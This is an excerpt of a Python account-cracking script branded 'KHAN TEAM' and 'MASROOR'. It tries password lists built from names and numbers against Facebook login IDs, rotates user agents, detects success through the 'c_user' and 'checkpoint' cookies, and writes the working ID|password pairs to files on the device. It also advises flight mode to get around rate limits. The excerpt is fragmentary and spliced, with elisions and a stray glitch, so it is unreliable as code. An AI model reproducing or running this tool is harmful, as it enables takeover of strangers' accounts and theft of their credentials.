...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> KHAN TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/MASROOR.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KHAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			MASROOR=session.cookies.get_dict().keys()
			if "c_user" in MASROOR:
				print('\r\r\033[1;31m[MASROOR-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/MASROOR-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in MASROOR:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[MASROOR-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/MASROOR-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KHAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in MASROOR:
				...
				print('\r\r\033[1;32m[MASROOR-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[MASROOR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mKHAN\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[MASROOR-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[38;5;208m[MASROOR-CP] '+cid+' | '+ps+'\33[0;97m')
...
fia()￼Enter		print('\x1b[1;91m[*] If You No Result Use Flight Mode ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+88','bangladish']
